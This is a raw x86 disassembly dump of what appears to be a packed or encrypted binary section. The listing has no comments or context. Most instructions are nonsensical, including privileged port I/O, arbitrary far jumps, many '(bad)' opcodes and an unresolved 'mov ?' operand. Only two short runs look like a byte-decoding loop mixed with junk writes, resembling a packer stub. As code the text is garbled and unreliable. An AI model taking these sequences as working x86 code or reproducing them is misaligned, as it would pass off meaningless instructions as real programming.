  403902:	jns    0x403917
  403904:	popa   
  403905:	dec    esi
  403906:	and    al,0x2f
  403908:	mov    cl,0xc9
  40390a:	dec    edx
  40390b:	cmp    ebx,DWORD PTR [ebx+0x7dd411be]
  403911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403912:	push   ss
  403913:	icebp  
  403914:	add    eax,0x31d137a0
  403919:	add    eax,0x39b35107
  40391e:	push   esp
  40391f:	mov    esi,0xaf06c0f3
  403924:	pop    edi
  403925:	inc    esp
  403926:	mov    esi,DWORD PTR [edi]
  403928:	repnz push ss
  40392a:	xor    BYTE PTR [esi+eax*8],bl
  40392d:	mov    ah,0x13
  40392f:	in     eax,0x83
  403931:	mov    WORD PTR [ebx+0x15ada60c],gs
  403937:	mov    ebx,DWORD PTR [eax]
  403939:	and    BYTE PTR [edx-0x70c62d81],ah
  40393f:	or     cl,BYTE PTR [esi]
  403941:	mov    ebp,0x36d3dba0
  403946:	jmp    0x50b9:0x72cc51fd
  40394d:	addr16 pop ebp
  40394f:	fnstsw WORD PTR [ecx+0x50a87459]
  403955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403956:	js     0x40393c
  403958:	in     al,dx
  403959:	sbb    DWORD PTR [edi+0x3e],ebx
  40395c:	jns    0x403991
  40395e:	cwde   
  40395f:	outs   dx,BYTE PTR ds:[esi]
  403960:	jae    0x403964
  403962:	dec    ebx
  403963:	add    eax,0xb652d58d
  403968:	xor    esp,esi
  40396a:	std    
  40396b:	in     al,dx
  40396c:	xchg   ecx,eax
  40396d:	mov    ah,0x51
  40396f:	add    BYTE PTR [ecx+ecx*2-0x1c65f442],dl
  403976:	enter  0x3da8,0x77
  40397a:	in     eax,0x4b
  40397c:	lods   al,BYTE PTR ds:[esi]
  40397d:	pop    eax
  40397e:	jle    0x4039de
  403980:	imul   eax,DWORD PTR ds:0x3ef93b8c,0x9b427256
  40398a:	(bad)  
  40398b:	push   ecx
  40398c:	out    0xa0,al
  40398e:	into   
  40398f:	sbb    BYTE PTR [ecx-0x7b],ch
  403992:	push   ss
  403993:	add    ebx,edx
  403995:	and    DWORD PTR [ebp+0x2ca14aea],esi
  40399b:	jle    0x4039f6
  40399d:	sub    al,0x8d
  40399f:	pop    ecx
  4039a0:	fs dec ebp
  4039a2:	mov    ebx,0x397359fe
  4039a7:	adc    edx,DWORD PTR [ecx+0x1e9ce3]
  4039ad:	loop   0x403a0e
  4039af:	cmp    edx,0xa
  4039b2:	hlt    
  4039b3:	out    dx,al
  4039b4:	jne    0x403a2f
  4039b6:	pop    ebx
  4039b7:	mov    ch,0xda
  4039b9:	js     0x403a18
  4039bb:	sbb    BYTE PTR [edi-0xd],cl
  4039be:	clc    
  4039bf:	xor    BYTE PTR [edi+0x74578b40],cl
  4039c5:	mov    bl,0xcd
  4039c7:	lock jl 0x40395d
  4039ca:	push   cs
  4039cb:	(bad)  
  4039cc:	push   esi
  4039cd:	stc    
  4039ce:	shr    ecx,0x7c
  4039d1:	dec    ecx
  4039d2:	dec    esp
  4039d3:	ret    
  4039d4:	mov    ds:0x45b21746,al
  4039d9:	adc    BYTE PTR [ebx],cl
  4039db:	pop    esp
  4039dc:	mov    eax,DWORD PTR [edi-0x2bfc432b]
  4039e2:	stos   DWORD PTR es:[edi],eax
  4039e3:	xor    eax,0x9feff5be
  4039e8:	adc    cl,BYTE PTR [edi]
  4039ea:	js     0x4039c1
  4039ec:	repnz lods al,BYTE PTR ds:[esi]
  4039ee:	mov    al,ds:0xd5a8faa6
  4039f3:	aad    0x89
  4039f5:	inc    esp
  4039f6:	jmp    0x42226a1b
  4039fb:	out    0x36,al
  4039fd:	mov    eax,ds:0xd9a79fb8
  403a02:	outs   dx,BYTE PTR es:[esi]
  403a04:	jl     0x4039ff
  403a06:	enter  0xfea7,0x3a
  403a0a:	dec    edx
  403a0b:	jmp    0x5c67:0xe813c281
  403a12:	std    
  403a13:	or     eax,0xdf8758b2
  403a18:	jns    0x4039bc
  403a1a:	pop    ss
  403a1b:	xchg   ebp,eax
  403a1c:	retf   
  403a1d:	or     eax,0xcb3de4e1
  403a22:	push   esp
  403a23:	jbe    0x403a96
  403a25:	mov    ecx,0x42628641
  403a2a:	mov    cl,0xb9
  403a2c:	test   al,0x87
  403a2e:	daa    
  403a2f:	push   es
  403a30:	add    eax,0x30d1f3a1
  403a35:	adc    ch,BYTE PTR [eax]
  403a37:	aas    
  403a38:	xchg   esi,eax
  403a39:	mov    esi,0xf3c885ea
  403a3e:	adc    eax,0xdc3bebde
  403a43:	pop    esp
  403a44:	push   eax
  403a45:	push   0xfffffff1
  403a47:	in     al,dx
  403a48:	ins    BYTE PTR es:[edi],dx
  403a49:	or     eax,0x3f27d25
  403a4e:	ins    BYTE PTR es:[edi],dx
  403a4f:	sti    
  403a50:	xor    dh,BYTE PTR ds:0x41dce70a
  403a56:	dec    edx
  403a57:	cmp    ebp,eax
  403a59:	sub    eax,DWORD PTR [ebp+0x3b]
  403a5c:	pop    eax
  403a5d:	lahf   
  403a5e:	lahf   
  403a5f:	mov    dl,0x1d
  403a61:	arpl   WORD PTR [ebx+ebx*8],bx
  403a64:	xchg   ebp,eax
  403a65:	rcr    DWORD PTR [edi+0x7c],1
  403a68:	test   al,0x6c
  403a6a:	add    eax,0x24038571
  403a6f:	push   esi
  403a70:	push   ebp
  403a71:	mov    DWORD PTR [eax+ebx*1+0x5010f20e],ecx
  403a78:	ret    
  403a79:	xchg   bl,ch
  403a7b:	das    
  403a7c:	inc    edi
  403a7d:	xor    dl,BYTE PTR [edi+0x1]
  403a80:	mov    WORD PTR [eax],ds
  403a82:	fdiv   st,st(0)
  403a84:	imul   ebx,DWORD PTR [edx],0xc818d412
  403a8a:	sbb    bh,BYTE PTR [ecx+0x1aff7356]
  403a90:	pop    eax
  403a91:	stos   BYTE PTR es:[edi],al
  403a92:	jns    0x403a2c
  403a94:	(bad)  
  403a95:	xchg   edi,eax
  403a96:	fild   WORD PTR [ebx]
  403a98:	lods   al,BYTE PTR ds:[esi]
  403a99:	xchg   esi,eax
  403a9a:	(bad)  
  403a9b:	and    eax,0x539dceef
  403aa0:	ret    
  403aa1:	xchg   edx,eax
  403aa2:	mul    ecx
  403aa4:	shl    BYTE PTR [edx],1
  403aa6:	fs jle 0x403a94
  403aa9:	xor    al,0xeb
  403aab:	movs   BYTE PTR es:[di],BYTE PTR cs:[si]
  403aae:	rcl    esi,1
  403ab0:	retf   
  403ab1:	lahf   
  403ab2:	push   esi
  403ab3:	jl     0x403aa7
  403ab5:	or     DWORD PTR [ebp-0xf],esp
  403ab8:	or     al,0x4d
  403aba:	fnstcw WORD PTR [edx]
  403abc:	dec    ecx
  403abd:	mov    bl,BYTE PTR [esi]
  403abf:	inc    BYTE PTR [ebp-0x40f8aee4]
  403ac5:	pop    ebp
  403ac6:	scas   eax,DWORD PTR es:[edi]
  403ac7:	cdq    
  403ac8:	pop    es
  403ac9:	jmp    0x403a6a
  403acb:	cmp    al,0x9b
  403acd:	popa   
  403ace:	jmp    0x6d4:0xb243abb8
  403ad5:	fidiv  WORD PTR [edx]
  403ad7:	inc    edx
  403ad8:	sar    DWORD PTR [ebp+0x6028931b],0xfb
  403adf:	scas   eax,DWORD PTR es:[edi]
  403ae0:	lea    eax,[esi-0x4213b65a]
  403ae6:	cmp    DWORD PTR [ebp+0x74461a40],esi
  403aec:	inc    edi
  403aed:	jl     0x403a92
  403aef:	mov    al,BYTE PTR gs:[ebp-0x1]
  403af3:	movzx  ecx,WORD PTR ds:0x42e6eb
  403afa:	adc    DWORD PTR ds:0x42fd76,ecx
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx+0x51df897],esi
  403b3e:	and    eax,0x70701ec5
  403b43:	cmp    eax,0x1b70707d
  403b48:	add    al,0x6a
  403b4a:	mov    ds:0x28ca8a37,eax
  403b4f:	std    
  403b50:	fmul   st(6),st
  403b52:	or     dl,dl
  403b54:	mov    BYTE PTR [edx-0x68],ah
  403b57:	daa    
  403b58:	mov    cl,0x9a
  403b5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b5b:	and    al,0xe1
  403b5d:	jbe    0x403bab
  403b5f:	mov    ecx,0x64d254ce
  403b64:	push   esi
  403b65:	cmc    
  403b66:	mov    ebp,DWORD PTR [ecx]
  403b68:	sub    eax,0x18b04b34
  403b6d:	aad    0xde
  403b6f:	test   al,0x44
  403b71:	(bad)  
  403b72:	pop    esi
  403b73:	or     al,0x43
  403b75:	sar    DWORD PTR [ecx-0x735aa2f1],1
  403b7b:	inc    esp
  403b7c:	sahf   
  403b7d:	fs jb  0x403be2
  403b80:	xchg   esi,ebx
  403b82:	jb     0x403b75
  403b84:	imul   ecx,DWORD PTR [edx-0x5fc9e01b],0xffffff91
  403b8b:	pop    ebp
  403b8c:	test   al,0x8a
  403b8e:	mov    cl,0x87
  403b90:	in     al,dx
  403b91:	pop    esp
  403b92:	aad    0x37
  403b94:	paddusw mm5,mm1
  403b97:	pop    esp
  403b98:	pop    edx
  403b99:	add    al,0x20
  403b9b:	dec    eax
  403b9c:	or     ebx,DWORD PTR [ebp+0x47cbbcdf]
  403ba2:	mov    bh,0x3e
  403ba4:	cli    
  403ba5:	mov    ecx,DWORD PTR [esp+ebx*4+0x872e381]
  403bac:	or     eax,0xc0fe49e5
  403bb1:	dec    esi
  403bb2:	cmc    
  403bb3:	js     0x403bb4
  403bb5:	inc    esp
  403bb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bb7:	sbb    esp,DWORD PTR [esi+eiz*2+0x1d8568eb]
  403bbe:	outs   dx,BYTE PTR ds:[esi]
  403bbf:	shl    BYTE PTR [eax],0x8
  403bc2:	pusha  
  403bc3:	dec    ecx
  403bc4:	outs   dx,BYTE PTR ds:[esi]
  403bc5:	push   ebp
  403bc6:	leave  
  403bc7:	ins    DWORD PTR es:[edi],dx
  403bc8:	out    0x7,eax
  403bca:	sbb    DWORD PTR [ecx+0x26],esp
  403bcd:	and    al,0x57
  403bcf:	push   edx
  403bd0:	xchg   esi,eax
  403bd1:	cmp    eax,0xaaae3777
  403bd6:	pushf  
  403bd7:	jg     0x403bcf
  403bd9:	mov    edi,0xae9109c4
  403bde:	int3   
  403bdf:	test   DWORD PTR [edx+eiz*2+0x58],esp
  403be3:	or     al,0xf9
  403be5:	or     dh,BYTE PTR [ebp+0x8bf4d3b]
  403beb:	lds    ecx,FWORD PTR [ebx+0x4]
  403bee:	repnz aaa 
  403bf0:	adc    al,0xf8
  403bf2:	sbb    al,0x7e
  403bf4:	mov    ss,ebp
  403bf6:	cmp    DWORD PTR [esi+0x75],edi
  403bf9:	stos   DWORD PTR es:[edi],eax
  403bfa:	dec    esi
  403bfb:	stc    
  403bfc:	sar    BYTE PTR [edx],0x48
  403bff:	add    eax,0x7078aeb1
  403c04:	xchg   esi,eax
  403c05:	mov    eax,0xd8ce6a0d
  403c0a:	shl    DWORD PTR [ecx+eax*8],1
  403c0d:	mov    ecx,0xf8842bdd
  403c12:	cmc    
  403c13:	jo     0x403bad
  403c15:	(bad)  
  403c16:	fild   DWORD PTR [ebp+0x1c21ac32]
  403c1c:	or     ecx,edi
  403c1e:	jno    0x403c8f
  403c20:	sbb    cl,bh
  403c22:	aaa    
  403c23:	jmp    edx
  403c25:	lea    ebx,[ecx+0x2f]
  403c28:	or     ah,al
  403c2a:	xchg   DWORD PTR [edi],edi
  403c2c:	sub    ebx,DWORD PTR [eax-0x3e84dc09]
  403c32:	sub    al,0x42
  403c34:	mov    eax,ds:0xdc0ba07e
  403c39:	out    dx,al
  403c3a:	mov    edi,eax
  403c3c:	mov    DWORD PTR [esi],esi
  403c3e:	mov    gs,WORD PTR [esi+0x4f]
  403c41:	std    
  403c42:	jge    0x403c2e
  403c44:	mul    DWORD PTR [ebx-0x11]
  403c47:	or     BYTE PTR [ecx],bh
  403c49:	rol    esi,cl
  403c4b:	jno    0x403c93
  403c4d:	xor    ah,BYTE PTR [ebx+0x3f771b8a]
  403c53:	sbb    dh,BYTE PTR [esp+ebx*1]
  403c56:	inc    ebp
  403c57:	enter  0x40e7,0x44
  403c5b:	sbb    eax,DWORD PTR [edx]
  403c5d:	pushf  
  403c5e:	mov    esp,0xdb261ac6
  403c63:	jns    0x403cd1
  403c65:	shl    DWORD PTR [edx+0x6ca32482],1
  403c6b:	mov    ebx,0x62c1293
  403c70:	clc    
  403c71:	xchg   ebx,eax
  403c72:	outs   dx,DWORD PTR ds:[esi]
  403c73:	pop    ecx
  403c74:	mov    ebx,0x74ea3bf0
  403c79:	enter  0xc6a6,0x47
  403c7d:	out    0xb0,al
  403c7f:	sub    ecx,DWORD PTR [edx]
  403c81:	push   eax
  403c82:	cdq    
  403c83:	pop    eax
  403c84:	adc    ebp,DWORD PTR [esi+ecx*8-0x4]
  403c88:	(bad)  
  403c89:	cmp    eax,ecx
  403c8b:	sbb    BYTE PTR [edx+esi*2-0x7360c2f9],bh
  403c92:	mov    ds:0x8fd3ae54,eax
  403c97:	repz repnz lea ecx,[eax-0xb528dae]
  403c9f:	es ja  0x403c6e
  403ca2:	or     DWORD PTR [edx*4-0x70bb9b5f],esp
  403ca9:	aam    0x78
  403cab:	bound  ebx,QWORD PTR [ecx]
  403cad:	ficom  WORD PTR [ecx]
  403caf:	ins    DWORD PTR es:[edi],dx
  403cb0:	imul   eax,DWORD PTR [ecx],0x2e
  403cb3:	sti    
  403cb4:	add    dl,BYTE PTR [esi+0x6ad9ae45]
  403cba:	out    0x29,al
  403cbc:	adc    bl,BYTE PTR [edi-0x6]
  403cbf:	div    bh
  403cc1:	sar    DWORD PTR [eax-0x5a89b34e],1
  403cc7:	popf   
  403cc8:	dec    esp
  403cc9:	outs   dx,BYTE PTR ds:[esi]
  403cca:	ins    BYTE PTR es:[edi],dx
  403ccb:	push   0xe40f69a9
  403cd0:	stos   BYTE PTR es:[edi],al
  403cd1:	jge    0x403d51
  403cd3:	and    dh,BYTE PTR [ebp-0x7eba215c]
  403cd9:	pop    edi
  403cda:	fdiv   DWORD PTR [ebx+0x7f1fdcf9]
  403ce0:	hlt    
  403ce1:	dec    edx
  403ce2:	jne    0x403d25
  403ce4:	(bad)  
  403ce6:	test   al,0x7f
  403ce8:	daa    
  403ce9:	push   ebp
  403cea:	mov    dh,bh
  403cec:	jnp    0x403c7c
  403cee:	in     al,0x4a
  403cf0:	add    BYTE PTR [edx+0x404bb595],ch
  403cf6:	dec    BYTE PTR [ecx+0x447b7b5f]
  403cfc:	div    BYTE PTR [edx+0x7]
  403cff:	lea    ebp,[edx+0x6e]
  403d02:	jbe    0x403ce5
  403d04:	jmp    0x2b620dbd
  403d09:	adc    esi,ecx
  403d0b:	sub    bl,BYTE PTR [edi-0x67]
  403d0e:	aam    0x8d
  403d10:	jns    0x403d76
  403d12:	xchg   ebp,eax
  403d13:	add    bh,BYTE PTR [ecx-0x3974eb4e]
  403d19:	dec    esi
  403d1a:	fistp  WORD PTR [ebp-0x743f0e92]
  403d20:	lahf   
  403d21:	cli    
  403d22:	add    BYTE PTR [edx],ch
  403d24:	xchg   edi,eax
  403d25:	xor    al,0x30
  403d27:	es loope 0x403d46
  403d2a:	sub    BYTE PTR [ebp-0x10],0x9f
  403d2e:	adc    al,0x29
  403d30:	push   es
  403d31:	inc    edx
  403d32:	inc    esi
  403d33:	dec    edx
  403d34:	dec    edx
  403d35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d36:	xchg   esp,eax
  403d37:	loopne 0x403d1a
  403d39:	add    BYTE PTR [edx+0x362f869a],cl
  403d3f:	addr16 jge 0x403da6
  403d42:	(bad)  
  403d43:	sbb    DWORD PTR [ebp+0x35b6d3cc],ebp
  403d49:	(bad)  
  403d4b:	sbb    bh,0x14
  403d4e:	adc    BYTE PTR [ecx+0x36],al
  403d51:	sti    
  403d52:	xchg   ebx,eax
  403d53:	mov    edx,0x75a88947
  403d58:	and    al,0xee
  403d5a:	cdq    
  403d5b:	jp     0x403d8e
  403d5d:	cmp    al,0xcf
  403d5f:	sub    DWORD PTR [ecx],esi
  403d61:	loop   0x403dc6
  403d63:	scas   al,BYTE PTR es:[edi]
  403d64:	dec    eax
  403d65:	push   es
  403d66:	mov    ebx,0x83f30d4c
  403d6b:	pop    ds
  403d6c:	xlat   BYTE PTR ds:[ebx]
  403d6d:	xlat   BYTE PTR ds:[ebx]
  403d6e:	dec    ecx
  403d6f:	loope  0x403dae
  403d71:	cmp    al,0x7a
  403d73:	lahf   
  403d74:	gs repnz add al,0x6d
  403d78:	jge    0x403d50
  403d7a:	mov    ds,ebp
  403d7c:	je     0x403d63
  403d7e:	or     DWORD PTR [edx+eiz*2-0x16],0x912a495d
  403d86:	fwait
  403d87:	outs   dx,DWORD PTR ds:[esi]
  403d88:	jge    0x403d9d
  403d8a:	in     eax,dx
  403d8b:	jb     0x403d42
  403d8d:	mov    ecx,0x700f5539
  403d92:	aaa    
  403d93:	mov    ?,WORD PTR ds:0xd26383cd
  403d99:	lahf   
  403d9a:	mov    esp,DWORD PTR [edi-0x251e91e3]
  403da0:	dec    ebx
  403da1:	aas    
  403da2:	adc    BYTE PTR [edi+0x265648d8],ah
  403da8:	xor    BYTE PTR [bp+di+0x4d],0xed
  403dad:	jnp    0x403d5c
  403daf:	jbe    0x403df1
  403db1:	dec    esi
  403db2:	sbb    al,0xf3
  403db4:	push   edx
  403db5:	mov    DWORD PTR [esp+ebp*1],esi
  403db8:	imul   ebx,DWORD PTR [edi+edx*8+0x75],0xbb01ac3d
  403dc0:	push   esp
  403dc1:	inc    edi
  403dc2:	popf   
  403dc3:	ror    DWORD PTR [ebp+0x2604156c],cl
  403dc9:	sub    BYTE PTR [eax+0x2b],al
  403dcc:	retf   
  403dcd:	mov    eax,ds:0xe0bb4b0a
  403dd2:	cmp    esp,DWORD PTR ss:[ebx+0x72]
  403dd6:	std    
  403dd7:	cmp    DWORD PTR ds:0x9c1b9dd3,esi
  403ddd:	dec    eax
  403dde:	jno    0x403dfd
  403de0:	mov    eax,0x11f179b1
  403de5:	(bad)  
  403de6:	leave  
  403de7:	in     al,0x6e
  403de9:	repz or al,0xd2
  403dec:	in     eax,0xe8
  403dee:	mov    al,ds:0x465ce94e
  403df3:	bound  edx,QWORD PTR [ebp+0x6c73b4df]
  403df9:	leave  
  403dfa:	inc    ecx
  403dfb:	jl     0x403df0
  403dfd:	enter  0xd0a1,0x4f
  403e01:	push   cs
  403e02:	mov    BYTE PTR [esp+eiz*2-0x172e18cc],al
  403e09:	adc    bh,al
  403e0b:	fwait
  403e0c:	push   ebp
  403e0d:	pop    esi
  403e0e:	rcl    edi,0xc7
  403e11:	inc    esp
  403e12:	xchg   BYTE PTR [ebx+0x70d09474],bl
  403e18:	pop    esi
  403e19:	in     eax,dx
  403e1a:	int3   
  403e1b:	in     eax,dx
  403e1c:	adc    eax,0xd49317
  403e21:	jmp    DWORD PTR [eax+0x5e8e8beb]
  403e27:	call   0xca0ec141
  403e2c:	pop    ds
  403e2d:	pop    ss
  403e2e:	sahf   
  403e2f:	stc    
  403e30:	fidiv  WORD PTR [edx-0x620e9d3f]
  403e36:	data16 mov bh,0x39
  403e39:	sub    eax,ebp
  403e3b:	loopne 0x403eb0
  403e3d:	push   ds
  403e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e3f:	cmp    al,BYTE PTR [ebp+0x23376b49]
  403e45:	arpl   WORD PTR [edi-0x80],sp
  403e48:	or     al,0x11
  403e4a:	mov    cl,0x9
  403e4c:	pop    es
  403e4d:	lods   eax,DWORD PTR ds:[esi]
  403e4e:	sub    ch,ah
  403e50:	push   esi
  403e51:	add    eax,0xa3298aa0
  403e56:	inc    ecx
  403e57:	dec    ebp
  403e58:	pop    es
  403e59:	mov    bh,0x3c
  403e5b:	cmp    eax,0x28b4f4ab
  403e60:	mov    WORD PTR [edi-0x7d],cs
  403e63:	sar    BYTE PTR ss:[esi-0x80],0x1c
  403e68:	call   0xf281:0x3204f44b
  403e6f:	inc    edx
  403e70:	ror    esi,1
  403e72:	mov    cl,0x89
  403e74:	xchg   BYTE PTR [esi+0x7e577f34],ch
  403e7a:	imul   BYTE PTR [ecx]
  403e7c:	cmp    al,0xd
  403e7e:	outs   dx,DWORD PTR ds:[esi]
  403e7f:	ror    DWORD PTR [edi],cl
  403e81:	sub    dl,cl
  403e83:	data16 scas al,BYTE PTR es:[edi]
  403e85:	pop    edi
  403e86:	arpl   WORD PTR [esi-0x77],bp
  403e89:	push   0xffffffc7
  403e8b:	inc    ebp
  403e8c:	lock xor BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x7e181c35
  403eec:	inc    esp
  403eed:	mov    ch,0x82
  403eef:	sbb    esi,DWORD PTR [eax+0x70]
  403ef2:	cmp    eax,0xcc70707d
  403ef7:	inc    edi
  403ef8:	jmp    0xdb0bd63e
  403efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403efe:	retf   
  403eff:	adc    DWORD PTR [edi+edi*1],esp
  403f02:	lea    edx,ds:[esi-0x58c50d4c]
  403f09:	into   
  403f0a:	adc    ch,cl
  403f0c:	not    DWORD PTR [ebx]
  403f0e:	mov    eax,ds:0xa8aa740
  403f13:	mov    edx,esp
  403f15:	test   BYTE PTR [ecx],cl
  403f17:	enter  0xe490,0xc1
  403f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f1c:	jae    0x403f88
  403f1e:	pop    esp
  403f1f:	push   ecx
  403f20:	adc    esi,esi
  403f22:	sub    bl,BYTE PTR [ecx]
  403f24:	push   0xd705783a
  403f29:	rcl    DWORD PTR [esp+ecx*2-0x48784b34],cl
  403f30:	inc    edx
  403f31:	fs jg  0x403fa0
  403f34:	pop    ds
  403f35:	int3   
  403f36:	cld    
  403f37:	cmp    al,0x47
  403f39:	adc    ch,BYTE PTR fs:[ebx]
  403f3c:	nop
  403f3d:	jl     0x403fbe
  403f3f:	(bad)
  403f43:	daa    
  403f44:	scas   eax,DWORD PTR es:[edi]
  403f45:	les    ebp,FWORD PTR [esi+0x4ab116a9]
  403f4b:	pop    ss
  403f4c:	add    esi,DWORD PTR [ebx+0x772ea8c9]
  403f52:	sbb    DWORD PTR [edi-0x11],edx
  403f55:	out    0x8a,al
  403f57:	and    ebx,DWORD PTR [ebx+ecx*8]
  403f5a:	dec    eax
  403f5b:	pop    esi
  403f5c:	inc    ecx
  403f5d:	sub    DWORD PTR cs:[edx+ecx*8+0x29ac3a5e],esp
  403f65:	sub    eax,0x24455ba7
  403f6a:	neg    DWORD PTR [eax-0x49]
  403f6d:	in     al,dx
  403f6e:	fidiv  DWORD PTR [eax]
  403f70:	push   es
  403f71:	(bad)  
  403f72:	sbb    eax,0x72240c30
  403f77:	test   BYTE PTR [esp+ebp*1-0x47],ah
  403f7b:	and    eax,0xfb0fa957
  403f80:	lahf   
  403f81:	xchg   DWORD PTR [eax-0x67137276],esp
  403f87:	mov    ch,0x2e
  403f89:	push   ebx
  403f8a:	ja     0x403f27
  403f8c:	jne    0x403f6f
  403f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f8f:	xor    eax,edi
  403f91:	out    0xe3,al
  403f93:	test   al,0x91
  403f95:	pop    esi
  403f96:	outs   dx,BYTE PTR ds:[esi]
  403f97:	lods   eax,DWORD PTR ds:[esi]
  403f98:	daa    
  403f99:	fprem1 
  403f9b:	icebp  
  403f9c:	jnp    0x403fe7
  403f9e:	mov    BYTE PTR [edx-0x3f58a7fc],ch
  403fa4:	add    al,0x6f
  403fa6:	fsub   st,st(6)
  403fa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fa9:	dec    edx
  403faa:	test   BYTE PTR [ecx],bh
  403fac:	jl     0x403f3a
  403fae:	stos   BYTE PTR es:[edi],al
  403faf:	jne    0x404010
  403fb1:	hlt    
  403fb2:	shl    DWORD PTR [edx],0x1a
  403fb5:	add    ecx,DWORD PTR [edi]
  403fb7:	or     ebp,ebp
  403fb9:	inc    edx
  403fba:	pop    eax
  403fbb:	jo     0x404005
  403fbd:	ins    BYTE PTR es:[edi],dx
  403fbe:	jecxz  0x403f6c
  403fc0:	pusha  
  403fc1:	aad    0x14
  403fc3:	inc    esp
  403fc4:	add    DWORD PTR [ecx],esp
  403fc6:	repz or eax,0xba57b9c8
  403fcc:	adc    DWORD PTR [edi+0x7da55225],ebp
  403fd2:	inc    edx
  403fd3:	scas   al,BYTE PTR es:[edi]
  403fd4:	add    cl,BYTE PTR [esi+0x3c763e75]
  403fda:	push   cs
  403fdb:	inc    edx
  403fdd:	dec    eax
  403fde:	jge    0x403fb3
  403fe0:	cmp    eax,0x52e24df5
  403fe5:	pop    esi
  403fe6:	jbe    0x40403d
  403fe8:	bound  ebp,QWORD PTR [esi+ebx*8]
  403feb:	or     BYTE PTR [esi-0x60],dh
  403fee:	add    al,0xc
  403ff0:	sub    dl,al
  403ff2:	rcr    DWORD PTR [esi+0x6341eb6a],0xb8
  403ff9:	fadd   st,st(7)
  403ffb:	shl    BYTE PTR [eax+ebx*1],1
  403ffe:	clc    
  403fff:	loop   0x403faa
  404001:	mov    BYTE PTR [edi+0x7],bh
  404004:	sbb    BYTE PTR [ecx*2+0x53eb3e3e],0x7a
  40400c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40400d:	sbb    ebx,ecx
  40400f:	fwait
  404010:	lock add esi,DWORD PTR [edi-0x793c6e78]
  404017:	cmp    eax,0xe3333bac
  40401c:	and    DWORD PTR [edi],edx
  40401e:	es mov ch,0xcb
  404021:	or     BYTE PTR [esi+0x25],dl
  404024:	mov    al,0x81
  404026:	sub    eax,0xe991f191
  40402b:	jnp    0x404078
  40402d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40402e:	fdivr  QWORD PTR [ebx+0x458657bd]
  404034:	mov    ecx,0x8ca2a747
  404039:	cs scas al,BYTE PTR es:[edi]
  40403b:	fmul   QWORD PTR [ebp-0xee30a9f]
  404041:	sub    DWORD PTR [eax],esi
  404043:	xchg   esp,eax
  404044:	dec    ebx
  404045:	jecxz  0x404002
  404047:	(bad)  
  404048:	fsub   QWORD PTR [edx+0x4a]
  40404b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40404c:	cmp    ch,ah
  40404e:	es dec ebx
  404050:	ds cmp eax,0x93fa30d9
  404056:	pop    esi
  404057:	xlat   BYTE PTR ds:[ebx]
  404058:	jl     0x404067
  40405a:	loope  0x4040b1
  40405c:	push   eax
  40405d:	scas   al,BYTE PTR es:[edi]
  40405e:	enter  0xb5e4,0xd0
  404062:	adc    eax,0x2a18e1b3
  404067:	or     DWORD PTR [edi],0x6
  40406a:	push   esp
  40406b:	pop    ebx
  40406c:	cwde   
  40406d:	pop    eax
  40406e:	xor    BYTE PTR [ecx],bl
  404070:	and    BYTE PTR [edi],cl
  404072:	add    DWORD PTR [edi],ebp
  404074:	dec    edi
  404075:	mov    cl,0x3d
  404077:	pop    ds
  404078:	not    DWORD PTR [edx-0x71]
  40407b:	xor    al,0xf4
  40407d:	push   esi
  40407e:	cwde   
  40407f:	int    0x4b
  404081:	std    
  404082:	dec    esi
  404083:	adc    BYTE PTR [esi+esi*1-0x7ff3bdc0],dh
  40408a:	add    edx,DWORD PTR [bx+si+0x16]
  40408e:	stos   BYTE PTR es:[edi],al
  40408f:	mov    edx,0xf57ec157
  404094:	aaa    
  404095:	das    
  404096:	mov    esp,?
  404098:	fbstp  TBYTE PTR [esi]
  40409a:	mov    DWORD PTR [edx+0x1ca038cb],ecx
  4040a0:	ficom  WORD PTR [ecx-0x24]
  4040a3:	loope  0x4040c2
  4040a5:	retf   
  4040a6:	scas   eax,DWORD PTR es:[edi]
  4040a7:	jb     0x4040d5
  4040a9:	sbb    eax,0x7eed2c13
  4040ae:	jmp    0x6585:0xf8469164
  4040b5:	and    BYTE PTR [esi*8+0xa87c42c],dl
  4040bc:	xchg   esi,eax
  4040bd:	dec    ebp
  4040be:	out    0xe4,eax
  4040c0:	clc    
  4040c1:	fs ret 
  4040c3:	lds    ecx,FWORD PTR [edi]
  4040c5:	cwde   
  4040c6:	xor    edx,esi
  4040c8:	call   0x8bf4a22e
  4040cd:	adc    al,0xe1
  4040cf:	cwde   
